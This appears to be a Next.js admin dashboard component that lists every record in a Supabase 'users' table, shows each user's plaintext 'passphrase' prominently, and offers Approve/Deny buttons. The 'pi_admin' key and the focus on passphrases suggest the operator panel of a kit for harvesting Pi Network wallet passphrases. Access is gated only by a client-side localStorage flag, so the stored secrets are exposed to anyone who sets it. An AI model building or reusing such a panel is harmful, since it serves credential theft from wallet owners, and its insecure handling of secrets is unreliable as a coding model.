'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { supabase } from '../../lib/supabase';

type User = {
  id: number;
  passphrase: string;
  message: string;
  status: string;
  created_at: string;
};

export default function AdminDashboard() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const router = useRouter();

  useEffect(() => {
    const admin = localStorage.getItem('pi_admin');
    if (!admin) { router.push('/admin'); return; }
    fetchUsers();
  }, [router]);

  const fetchUsers = async () => {
    const { data } = await supabase.from('users').select('*').order('created_at', { ascending: false });
    if (data) setUsers(data);
    setLoading(false);
  };

  const updateStatus = async (id: number, status: string) => {
    await supabase.from('users').update({ status }).eq('id', id);
    setUsers(prev => prev.map(u => u.id === id ? { ...u, status } : u));
  };

  const handleLogout = () => { localStorage.removeItem('pi_admin'); router.push('/admin'); };

  if (loading) return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="animate-spin h-10 w-10 border-4 border-amber-500 border-t-transparent rounded-full"></div></div>;

  const pending = users.filter(u => u.status === 'pending');

  return (
    <div className="min-h-screen bg-gray-100">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <h1 className="text-2xl font-bold text-gray-900">Admin Dashboard</h1>
          <button onClick={handleLogout} className="px-4 py-2 bg-red-500 hover:bg-red-600 text-white text-sm rounded-lg">Logout</button>
        </div>
      </header>
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="bg-white rounded-xl p-6 border shadow-sm mb-6">
          <p className="text-lg font-semibold text-gray-900">Pending Requests: {pending.length}</p>
        </div>
        {users.map(user => (
          <div key={user.id} className="bg-white rounded-xl p-6 border shadow-sm mb-4">
            <div className="bg-amber-50 border-2 border-amber-200 rounded-xl p-4 mb-3">
              <p className="text-xs text-amber-600 font-bold uppercase">🔑 Passphrase</p>
              <p className="font-mono text-xl font-bold text-amber-900 break-all">{user.passphrase}</p>
            </div>
            {user.message && <p className="text-sm text-gray-600 mb-2 italic">"{user.message}"</p>}
            <p className="text-xs text-gray-400 mb-3">Status: <span className={`font-semibold ${user.status === 'approved' ? 'text-green-600' : user.status === 'denied' ? 'text-red-600' : 'text-yellow-600'}`}>{user.status}</span></p>
            {user.status === 'pending' && (
              <div className="flex gap-3">
                <button onClick={() => updateStatus(user.id, 'approved')} className="bg-green-600 hover:bg-green-700 text-white px-5 py-2 rounded-lg text-sm">✅ Approve</button>
                <button onClick={() => updateStatus(user.id, 'denied')} className="bg-red-600 hover:bg-red-700 text-white px-5 py-2 rounded-lg text-sm">❌ Deny</button>
              </div>
            )}
          </div>
        ))}
      </main>
    </div>
  );
}